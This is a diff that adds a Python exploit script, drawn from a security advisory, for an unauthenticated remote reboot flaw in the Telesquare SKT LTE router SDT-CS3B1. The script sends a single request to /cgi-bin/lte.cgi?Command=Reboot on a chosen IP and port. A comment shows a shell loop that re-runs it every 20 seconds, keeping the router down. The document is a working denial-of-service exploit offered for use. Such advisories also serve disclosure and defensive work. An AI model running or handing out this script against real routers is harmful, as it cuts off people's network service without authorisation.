@@ -1,0 +1,62 @@
+#!/usr/bin/env python
+#
+#
+# Telesquare SKT LTE Router SDT-CS3B1 Remote Reboot Denial Of Service
+#
+#
+# Vendor: Telesquare Co., Ltd.
+# Product web page: http://www.telesquare.co.kr
+# Affected version: FwVer: SDT-CS3B1, sw version 1.2.0
+#                   LteVer: ML300S5XEA41_090  1 0.1.0
+#                   Modem model: PM-L300S
+#
+# Summary: We introduce SDT-CS3B1 LTE router which is a SKT 3G and 4G
+# LTE wireless communication based LTE router product.
+#
+# Desc: The router suffers from an unauthenticated reboot command execution.
+# Attackers can exploit this issue to cause a denial of service scenario.
+#
+# --------------------------------------------------------------------
+# /lte/lteuicc.shtml:
+# -------------------
+#
+# 858: function RebootRequest()
+# 859: {
+# 860:     var url = "../cgi-bin/lte.cgi?";
+# 861:     var param = "Command=Reboot";
+# 862:     XHRPost(RebootHandle, url, param, false ); //sync call
+# 863: }
+# 
+# --------------------------------------------------------------------
+#
+# Tested on: lighttpd/1.4.20
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2017-5444
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5444.php
+#
+#
+# 22.12.2017
+#
+
+
+import sys, requests
+
+if len(sys.argv) < 2:
+	print 'SKT LTE Router SDT-CS3B1 Remote Reboot'
+	print 'Usage: b00t.py <ip> <port>\n'
+	quit()
+
+ip = sys.argv[1]
+port = sys.argv[2]
+
+r = requests.get("http://"+ip+":"+port+"/cgi-bin/lte.cgi?Command=Reboot")
+
+# shw: while true; do ./b00t.py 10.0.0.17 8081; sleep 20; done
+#print r.content  #if in r.content: <xml></xml>, reboot true.
+
+print "Router rebooted."
